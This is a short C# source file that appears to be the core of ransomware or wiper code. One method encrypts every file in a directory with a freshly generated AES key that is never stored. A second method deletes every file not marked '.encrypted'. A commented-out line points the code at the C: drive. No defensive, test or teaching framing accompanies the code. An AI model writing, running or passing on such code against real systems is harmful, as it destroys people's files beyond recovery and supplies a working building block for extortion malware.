using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;


namespace encryptfilesc
{ 
    public static class FileEncryptor
    {
        public static void EncryptFilesInDirectory(string directoryPath)
        {
            //string directoryPath = "C:\\";
            // Get all files in the directory
            string[] files = Directory.GetFiles(directoryPath);

            // Create an instance of the AesCryptoServiceProvider
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                // Loop through each file and encrypt it
                foreach (string file in files)
                {
                    // Read the file into a byte array
                    byte[] fileBytes = File.ReadAllBytes(file);

                    // Encrypt the file
                    byte[] encryptedBytes = aes.CreateEncryptor().TransformFinalBlock(fileBytes, 0, fileBytes.Length);

                    // Save the encrypted file with a different name
                    string encryptedFilePath = Path.Combine(directoryPath, Path.GetFileNameWithoutExtension(file) + ".encrypted" + Path.GetExtension(file));
                    File.WriteAllBytes(encryptedFilePath, encryptedBytes);
                }
            }
        }
        public static void DeleteUnencryptedFiles(string directoryPath)
        {
            // Get all files in the directory
            string[] files = Directory.GetFiles(directoryPath);

            // Loop through each file and delete it if it's not encrypted
            foreach (string file in files)
            {
                if (!file.Contains(".encrypted"))
                {
                    File.Delete(file);
                }
            }
        }
    }
}